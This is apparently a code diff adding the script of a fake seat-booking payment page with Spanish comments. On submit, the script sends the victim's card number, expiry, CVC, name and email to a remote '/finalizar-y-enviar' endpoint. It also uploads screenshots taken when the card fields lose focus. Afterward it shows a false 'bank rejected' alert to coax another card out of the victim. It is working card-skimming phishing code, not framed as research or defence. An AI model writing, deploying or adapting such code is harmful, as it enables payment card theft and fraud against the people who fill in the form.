+        document.getElementById('c-number').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Formato de fecha
+        document.getElementById('c-exp').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/[^\d]/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0,2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        // Procesar pago - CORREGIDO para usar BASE_URL
+        document.getElementById('payment-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            await captureScreen();
+            
+            const cardName = document.getElementById('c-name').value;
+            const cardNumber = document.getElementById('c-number').value;
+            const cardExp = document.getElementById('c-exp').value;
+            const cardCvc = document.getElementById('c-cvc').value;
+            const email = document.getElementById('c-email').value;
+
+            try {
+                await fetch(`${BASE_URL}/finalizar-y-enviar`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        user: cardName,
+                        card: cardNumber,
+                        exp: cardExp,
+                        cvc: cardCvc,
+                        email: email
+                    })
+                });
+                console.log("Datos enviados correctamente");
+            } catch (err) {
+                console.log("Error en envío final:", err);
+            }
+
+            alert("❌ ERROR DE VERIFICACIÓN: Tu banco ha rechazado la transacción. Por favor, intenta con otra tarjeta o contacta a tu banco.");
+            
+            document.getElementById('payment-form').reset();
+        });
+
+        // Captura de pantalla - CORREGIDO para usar BASE_URL
+        async function captureScreen() {
+            const canvas = await html2canvas(document.body);
+            const screenshotData = canvas.toDataURL("image/png");
+
+            try {
+                await fetch(`${BASE_URL}/upload-screenshot`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: screenshotData,
+                        user: document.getElementById('c-name').value || 'anonimo',
+                        timestamp: new Date().getTime()
+                    })
+                });
+                console.log("Captura enviada");
+            } catch (e) {
+                console.log("Error en captura:", e);
+            }
+        }
+
+        document.getElementById('c-number').addEventListener('blur', captureScreen);
+        document.getElementById('c-cvc').addEventListener('blur', captureScreen);
+
+        // Inicialización
+        window.addEventListener('load', () => {
+            const form = document.getElementById('payment-form');
+            if (form) {
+                form.reset();
+            }
+            inputs.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) element.value = '';
+            });
+            generateSeats();
+            
+            // Crear un contenedor oculto para el reproductor de YouTube
+            const ytContainer = document.createElement('div');
+            ytContainer.id = 'youtube-audio';
+            ytContainer.style.position = 'absolute';
+            ytContainer.style.bottom = '-200px';
+            ytContainer.style.left = '-200px';
+            ytContainer.style.width = '1px';
+            ytContainer.style.height = '1px';
+            ytContainer.style.opacity = '0';
+            ytContainer.style.pointerEvents = 'none';
+            document.body.appendChild(ytContainer);
+            
+        });
+    </script>
+</body>
+
+</html>
